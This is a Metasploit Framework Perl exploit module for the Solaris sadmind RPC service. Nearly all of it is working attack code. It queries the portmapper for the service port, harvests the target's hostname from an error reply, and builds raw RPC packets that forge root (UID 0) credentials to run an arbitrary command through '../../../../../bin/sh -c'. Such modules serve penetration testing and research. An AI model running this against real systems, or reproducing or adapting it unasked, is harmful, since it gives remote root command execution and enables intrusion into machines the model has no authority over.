package Msf::Exploit::solaris_sadmind_exec;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Solaris sadmind Remote Execution',
    'Version'  => '2.0',
    'Author'  => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
    'Arch'  => [ ],
    'OS'    => [ 'solaris' ],
    'Priv'  => 1,
    'Keys'  => ['cmd'],
    'Payload' => 
     {
        'Space'  => 512,
        'BadChars' => "\x00",
     },
    
    'UserOpts'  => 
    {
        'RHOST' => [1, 'ADDR', 'The target address'],
        'PPORT' => [0, 'PORT', 'The rpc portmapper port', 111],
        'SPORT' => [0, 'PORT', 'The sadmind target port'],
    },
    
    'Description'  =>  "This exploit targets a weakness in the default security settings ".
                       "of the sadmind RPC application. This server is installed and ".
                       "enabled by default on most versions of the Solaris operating ".
                       "system.",
                
    'Refs'  =>  [  
                    'http://lists.insecure.org/lists/vulnwatch/2003/Jul-Sep/0115.html'
                ],
    'Targets' => [  ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $portmap = $self->GetVar('PPORT') || 111;
    my $target_port = $self->GetVar('SPORT') || rpc_getport($target_host, $portmap, 100232, 10);

    # Use an invalid hostname to obtain the real hostname
    my $target_name = "METASPLOIT";
    my $s = Msf::Socket->new();
    
    if (! $s->udp($target_host, $target_port)) 
    {
        $self->PrintLine("[*] Could not create socket to RPC service");
        return(0);
    }
    
    $s->send(rpc_sadmin_exec($target_name, "true"));
    my $r = $s->recv(5);

    if ($r && $r =~ m/Security exception on host (.*)\.  USER/)
    {
        $target_name = $1;
    } else {
        $self->PrintLine("[*] Could not obtain target hostname");
        return(0);
    }
    
    $self->PrintLine("[*] Testing sadmind service on '$target_name'");
    $s->send(rpc_sadmin_exec($target_name, "true"));
    my $r = $s->recv(5);
    $s->close();

    if ($r)
    {
        if ($r =~ m/Security exception on host (.*)\.  USER/)
        {
            $self->PrintLine("[*] The server reports access denied for sadmind");
            return(0);
        } else {
            $self->PrintLine("[*] The server appears to be vulnerable");
            return(1);
        }
    }

    $self->PrintLine("[*] No response received from server");
    return(0);
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $portmap = $self->GetVar('PPORT') || 111;
    my $target_port = $self->GetVar('SPORT') || rpc_getport($target_host, $portmap, 100232, 10);
    my $encodedPayload = $self->GetVar('EncodedPayload');

    if (! $target_port)
    {
        $self->PrintLine("[*] Error: Could not determine port used by sadmind");
        exit(0);
    }

    $self->PrintLine("[*] Trying to obtain hostname of $target_host:$target_port");

    # Use an invalid hostname to obtain the real hostname
    my $target_name = "METASPLOIT";
    my $s = Msf::Socket->new();
    
    if (! $s->udp($target_host, $target_port)) { return }
    
    $s->send(rpc_sadmin_exec($target_name, "true"));
    
    my $r = $s->recv(5);
    $s->close();

    if ($r && $r =~ m/Security exception on host (.*)\.  USER/)
    {
        $target_name = $1;
    } else {
        $self->PrintLine("[*] Could not obtain target hostname");
        exit(0);
    }
    
    $self->PrintLine("[*] Using hostname of '$target_name'");
    
    $s = Msf::Socket->new();
    if (! $s->udp($target_host, $target_port)) { exit(0) }

    $self->PrintLine("[*] Executing command " . $encodedPayload->RawPayload);

    $s->send(rpc_sadmin_exec($target_name, $encodedPayload->RawPayload));
    sleep(3);
}

sub rpc_getport {
    my ($target_host, $target_port, $prog, $vers) = @_;
    
    my $s = Msf::Socket->new();
    $s->udp($target_host, $target_port);

    my $portmap_req =
        
        pack("L", rand() * 0xffffffff) . # XID
        pack("N", 0x00).                 # Call
        pack("N", 0x02).                 # RPC Version
        pack("N", 0x000186a0).           # Program Number  (PORTMAP)
        pack("N", 0x02).                 # Program Version (2)
        pack("N", 0x03).                 # Procedure (getport)
        ("\x00" x 16).                   # Credentials and Verifier
        pack("N", $prog) .
        pack("N", $vers).
        pack("N", 0x11).                 # Protocol: UDP
        pack("N", 0x00);                 # Port: 0

    $s->send($portmap_req);

    my $r = $s->recv(5);
    $s->close();
    
    if (length($r) == 28) 
    { 
        my $prog_port = unpack("N",substr($r, 24, 4));
        return($prog_port); 
    }
    
    return undef;
}


sub rpc_sadmin_exec {

    my ($hostname, $command) = @_;
    my $packed_host = $hostname . ("\x00" x (59 - length($hostname)));
    
    
    my $rpc =
        pack("L", rand() * 0xffffffff) . # XID
        pack("N", 0x00).                 # Call
        pack("N", 0x02).                 # RPC Version
        pack("N", 0x00018788).           # Program Number  (SADMIND)
        pack("N", 0x0a).                 # Program Version (10)
        pack("N", 0x01).                 # Procedure
        pack("N", 0x01);                 # Credentials (UNIX)
                                         # Auth Length is filled in

    # pad it up to multiples of 4
    my $rpc_hostname = $hostname;
    while (length($rpc_hostname) % 4 != 0) { $rpc_hostname .= "\x00" }
    
    my $rpc_auth =
        # Time Stamp
        pack("N", time() + 20001) .

        # Machine Name
        pack("N", length($hostname)) . $rpc_hostname .

        # UID = 0, GID = 0, No Extra Groups  
        pack("NNN", 0, 0, 0);



    $rpc .= pack("N", length($rpc_auth)) . $rpc_auth . ("\x00" x 8);

    my $header =
    
    # Another Time Stamp
    reverse(pack("L", time() + 20005)) .

    "\x00\x07\x45\xdf".
    
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04".
    
    "\x7f\x00\x00\x01".                 # 127.0.0.1
    "\x00\x01\x87\x88".                 # SADMIND
    
    "\x00\x00\x00\x0a\x00\x00\x00\x04".
    
    "\x7f\x00\x00\x01".                 # 127.0.0.1
    "\x00\x01\x87\x88".                 # SADMIND

    "\x00\x00\x00\x0a\x00\x00\x00\x11\x00\x00\x00\x1e".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00".

    "\x00\x00\x00\x3b". $packed_host.

    "\x00\x00\x00\x00\x06" . "system".
    
    "\x00\x00\x00\x00\x00\x15". "../../../../../bin/sh". "\x00\x00\x00";
    
    # Append Body Length ^-- Here

    my $body = 
    "\x00\x00\x00\x0e". "ADM_FW_VERSION".
    "\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00".
    "\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x08". "ADM_LANG".
    "\x00\x00\x00\x09\x00\x00\x00\x02\x00\x00".
    "\x00\x01". "C" . 
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x0d". "ADM_REQUESTID".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x12\x00\x00\x00\x11".
    "0810:1010101010:1"."\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00".

    "\x00\x00\x00\x09". "ADM_CLASS".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x07".
    "\x00\x00\x00\x06" . "system" .
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x0e" . "ADM_CLASS_VERS" .
    "\x00\x00\x00\x00\x00\x09\x00\x00\x00\x04".
    "\x00\x00\x00\x03". "2.1".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x0a" . "ADM_METHOD" . 
    "\x00\x00\x00\x00\x00\x09\x00\x00\x00\x16".
    "\x00\x00\x00\x15". "../../../../../bin/sh" . 
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x08". "ADM_HOST" .
    "\x00\x00\x00\x09\x00\x00\x00\x3c\x00\x00\x00\x3b".
    $packed_host.

    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x0f". "ADM_CLIENT_HOST".
    "\x00\x00\x00\x00\x09".
    
    pack("N", length($hostname) + 1) .
    pack("N", length($hostname)) .
    $rpc_hostname .
    "\x00\x00\x00\x00". "\x00\x00\x00\x00".
    
    "\x00\x00\x00\x11" . "ADM_CLIENT_DOMAIN".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x11" . "ADM_TIMEOUT_PARMS".
    "\x00\x00\x00\x00\x00".
    "\x00\x09\x00\x00\x00\x1c".
    "\x00\x00\x00\x1b" . "TTL=0 PTO=20 PCNT=2 PDLY=30".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x09" . "ADM_FENCE" .
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x01\x58\x00\x00\x00\x00\x00\x00\x09\x00".
    "\x00\x00\x03\x00\x00\x00\x02" . "-c" .
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x59\x00".
    "\x00\x00\x00\x00\x00\x09\x00\x00\x02\x01\x00\x00\x02\x00".

    $command . ("\x00" x (512 - length($command))).

    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10".
    "netmgt_endofargs";

    my $res = $rpc . $header . pack("N", (length($body) + 4 + length($header)) - 330) . $body;

    return($res);
}

1;
